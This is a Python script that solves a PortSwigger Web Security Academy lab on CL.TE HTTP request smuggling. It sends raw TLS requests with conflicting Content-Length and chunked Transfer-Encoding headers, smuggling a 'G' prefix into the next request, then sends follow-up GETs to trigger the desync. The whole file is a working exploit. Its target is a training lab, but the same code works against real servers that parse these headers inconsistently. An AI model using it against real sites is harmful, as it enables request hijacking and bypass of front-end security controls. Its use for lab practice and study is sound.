import socket
import ssl

hostname = 'acaa1f361eb8fe058096557f008b00ea.web-security-academy.net'
context = ssl.create_default_context()

def sendReq(req):
	print('[*] Request')
	print(req)
	print('=====')
	s = socket.create_connection((hostname,443))
	ssock  = context.wrap_socket(s,server_hostname=hostname)
	a = ssock.send(req)
	print((a))
	print()
	print()
	d = ssock.recv(4096)
	print(d)
	s.close()
	
	return len(d)




originalReq = '''GET / HTTP/1.1
Host: %s
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

'''%hostname

body = '''
3
x=1
0

G'''

linecount = body.count('\n')-1

clte = '''POST / HTTP/1.1
Host:%s
Content-Length:%d
Transfer-Encoding:chunked
'''%(hostname,len(body)-1+linecount)

clte = clte+body
clte = clte.replace('\x0a','\x0d\x0a')

sendReq(clte)
for i in range(0,2):
	sendReq(originalReq)
